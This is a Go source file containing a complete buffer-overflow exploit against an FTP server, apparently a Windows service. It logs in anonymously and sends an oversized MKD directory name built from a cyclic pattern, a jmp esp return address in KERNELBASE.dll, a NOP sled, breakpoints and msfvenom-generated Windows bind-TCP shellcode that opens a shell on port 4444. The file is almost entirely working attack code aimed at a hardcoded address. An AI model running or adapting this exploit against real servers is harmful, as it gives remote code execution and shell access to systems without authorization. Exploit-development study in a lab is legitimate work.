package main

import (
	"log"
	"strings"

	"github.com/jlaffaye/ftp"
	// go get -u github.com/radare/r2pipe-go
)

var HOST = "192.168.0.16" // Replace with actual ip
var PORT = "21"           // Replace with actual port

func bindTCPShellcode() string {
	// msfvenom -a x86 --platform windows -p windows/shell/bind_tcp LPORT=4444 -f python -b '\x00\x09\x0a\x0d\x1a\x20'
	buf := "" +
		"\xd9\xcc\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x4e\xba\xac" +
		"\x47\x96\xc1\x31\x50\x18\x03\x50\x18\x83\xe8\x50\xa5" +
		"\x63\x3d\x40\xa8\x8c\xbe\x90\xcd\x05\x5b\xa1\xcd\x72" +
		"\x2f\x91\xfd\xf1\x7d\x1d\x75\x57\x96\x96\xfb\x70\x99" +
		"\x1f\xb1\xa6\x94\xa0\xea\x9b\xb7\x22\xf1\xcf\x17\x1b" +
		"\x3a\x02\x59\x5c\x27\xef\x0b\x35\x23\x42\xbc\x32\x79" +
		"\x5f\x37\x08\x6f\xe7\xa4\xd8\x8e\xc6\x7a\x53\xc9\xc8" +
		"\x7d\xb0\x61\x41\x66\xd5\x4c\x1b\x1d\x2d\x3a\x9a\xf7" +
		"\x7c\xc3\x31\x36\xb1\x36\x4b\x7e\x75\xa9\x3e\x76\x86" +
		"\x54\x39\x4d\xf5\x82\xcc\x56\x5d\x40\x76\xb3\x5c\x85" +
		"\xe1\x30\x52\x62\x65\x1e\x76\x75\xaa\x14\x82\xfe\x4d" +
		"\xfb\x03\x44\x6a\xdf\x48\x1e\x13\x46\x34\xf1\x2c\x98" +
		"\x97\xae\x88\xd2\x35\xba\xa0\xb8\x51\x0f\x89\x42\xa1" +
		"\x07\x9a\x31\x93\x88\x30\xde\x9f\x41\x9f\x19\xe0\x7b" +
		"\x67\xb5\x1f\x84\x98\x9f\xdb\xd0\xc8\xb7\xca\x58\x83" +
		"\x47\xf3\x8c\x3e\x43\x52\x7f\x5d\xae\x0e\x7e\xcb\x53" +
		"\xa6\x6a\x04\x8b\xd6\x94\xce\xa4\x7e\x69\xf1\xdb\x22" +
		"\xe4\x17\xb1\xca\xa0\x80\x2e\x28\x97\x18\xc8\x53\xfd" +
		"\xe2\xd6\xde\xa6\xbb\xbe\x97\xbe\x7c\xc0\x28\x95\x2a" +
		"\x56\xa2\xfa\xee\x47\xb5\xd6\x46\x1f\x21\xac\x06\x52" +
		"\xd0\xb1\x02\x06\x12\x24\xa9\x81\x45\xd0\xb3\xf4\xa1" +
		"\x7f\x4b\xd3\xb2\x78\xb3\xa2\x99\xf3\x82\x30\xa1\x6b" +
		"\xeb\xd4\x21\x6c\xbd\xbe\x21\x04\x19\x9b\x72\x31\x66" +
		"\x36\xe7\xea\xf3\xb9\x51\x5e\x53\xd2\x5f\xb9\x93\x7d" +
		"\xa0\xec\xa7\x7a\x5e\x71\xaf\x7b\x9d\xa4\x69\x0e\xc8" +
		"\x74\xce\x01\xbf\xd9\x67\x88\xbf\x4e\x77\x99"
	return buf
}

func pattern() string {
	// ragg2 -P 1000 -r
	return "AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmABnABoABpABqABrABsABtABuABvABwABxAByABzAB1AB2AB3AB4AB5AB6AB7AB8AB9AB0ACBACCACDACEACFACGACHACIACJACKACLACMACNACOACPACQACRACSACTACUACVACWACXACYACZACaACbACcACdACeACfACgAChACiACjACkAClACmACnACoACpACqACrACsACtACuACvACwACxACyACzAC1AC2AC3AC4AC5AC6AC7AC8AC9AC0ADBADCADDADEADFADGADHADIADJADKADLADMADNADOADPADQADRADSADTADUADVADWADXADYADZADaADbADcADdADeADfADgADhADiADjADkADlADmADnADoADpADqADrADsADtADuADvADwADxADyADzAD1AD2AD3AD4AD5AD6AD7AD8AD9AD0AEBAECAEDAEEAEFAEGAEHAEIAEJAEKAELAEMAENAEOAEPAEQAERAESAETAEUAEVAEWAEXAEYAEZAEaAEbAEcAEdAEeAEfAEgAEhAEiAEjAEkAElAEmAEnAEoAEpAEqAErAEsAEtAEuAEvAEwAExAEyAEzAE1AE2AE3AE4AE5AE6AE7AE8AE9AE0AFBAFCAFDAFEAFFAFGAFHAFIAFJAFKAFLAFMAFNAFOAFPAFQAFRAFSAFTAFUAFVAFWAFXAFYAFZAFaAFbAFc"
}

func jmpESP() string {
	// 0x74e02001 @ KERNELBASE.dll => jmp esp
	return "\x01\x20\xe0\x74"
}

func breakpoints(quantity int) string {
	return strings.Repeat("\xcc\xcc\xcc\xcc", quantity)
}

func nopslead(lenght int) string {
	return strings.Repeat("\x90\x90\x90\x90", lenght)
}

func attack(payload string) error {
	client, err := ftp.Dial(HOST + ":" + PORT)
	if err != nil {
		log.Fatal(err)
		return err
	}

	if err := client.Login("anonymous", "anonymous"); err != nil {
		log.Fatal(err)
		return err
	}

	if err := client.MakeDir(payload); err != nil {
		log.Fatal(err)
		return err
	}
	return nil
}

func main() {
	// override eip with 0x74e02001 => jmp esp + place a breakpoint to confirm we have code execution in the stack
	payload := pattern()[:247] + jmpESP() + nopslead(2) + breakpoints(2) + bindTCPShellcode()

	log.Println("Payload:", payload)
	log.Println("Payload len:", len(payload))

	if err := attack(payload); err != nil {
		log.Fatal("Attack failed!")
	}
}
